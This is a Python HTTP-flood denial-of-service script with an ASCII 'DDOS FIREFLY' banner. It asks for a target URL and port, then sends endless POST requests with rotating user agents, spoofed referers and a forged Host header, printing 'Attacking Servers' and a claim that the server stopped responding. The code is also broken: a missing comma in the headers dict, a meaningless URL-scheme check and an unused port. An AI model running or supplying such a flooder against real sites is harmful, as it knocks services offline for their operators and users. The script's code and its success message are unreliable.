import requests
import time
import random
import os

red = '\033[1;91m'
green = '\033[1;32m'
blue = '\033[1;34m'
yellow = '\033[1;33m'
white = '\033[37m'

global user_agents
user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
if os.name == "posix":
    os.system('clear')
if os.name == "nt":
    os.system('cls')    
print('\n')    
print("""

██████╗ ██████╗  ██████╗ ███████╗    ███████╗██╗██████╗ ███████╗███████╗██╗  ██╗   ██╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔════╝██║██╔══██╗██╔════╝██╔════╝██║  ╚██╗ ██╔╝
██║  ██║██║  ██║██║   ██║███████╗    █████╗  ██║██████╔╝█████╗  █████╗  ██║   ╚████╔╝ 
██║  ██║██║  ██║██║   ██║╚════██║    ██╔══╝  ██║██╔══██╗██╔══╝  ██╔══╝  ██║    ╚██╔╝  
██████╔╝██████╔╝╚██████╔╝███████║    ██║     ██║██║  ██║███████╗██║     ███████╗██║   
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝╚═╝   
""")    
print(blue + f"\t\tMade By : MrSanZz")
print(blue + f"\t\tTeam : EIHT")
print(blue + f"\t\tDon't Recode This Skid!!")
print(blue + f"\tEnjoy!")
print('\033[1;3m')
ip = input(yellow + f"Target URL : ")
if "https://" in ip:
    pass
elif "https://" in ip is None:
    ip = f"https://{ip}"    
port = input(yellow + "Port : ")
if os.name == "posix":
    os.system('clear')
if os.name == "nt":
    os.system('cls') 
print(green + f"\033[1;3mParticle Laser Is Starting..")
time.sleep(2)
while True:
    counter = 1
    counter = counter + 1
    for i in range(200):
        try:
            y = random.choice(user_agents)
            url = ip
            urls = ['https://www.dpr.go.id', 'https://www.yandex.com', 'https://eiht.my.id', 'https://www.google.com', 'https://www.nasa.gov', 'https://www.cia.gov', 'https://spacex.com', 'https://lahelu.com', 'https://data.gov.il', 'https://kosred.com', 'https://pornhub.com']
            res = random.choice(urls)
            headers = {
                "User-Agent": f"{y}",
                "Pragma": "no-cache",
                "Connection": "Keep-Alive",
                "Referer": f"{res}",
                "Cache-Control": "no-store, no-cache"
                "Host": "192.167.1.5"
            }
            response = requests.post(url, headers=headers)
            print(f"{red}Attacking {yellow}Servers{red} At{blue} {ip} {red}Port {blue}{port} : {white}", counter)
            print(response)
        except KeyboardInterrupt:
            print("KeyboardInterrupt")
            exit()
        except requests.exceptions.MissingSchema:
            print(red + f"Error While Attacking.. Did you write the Targets URL correctly?")
            exit()
    print(green + f"[ + ] The Server Just Stopped Responding.. [ + ]")
    
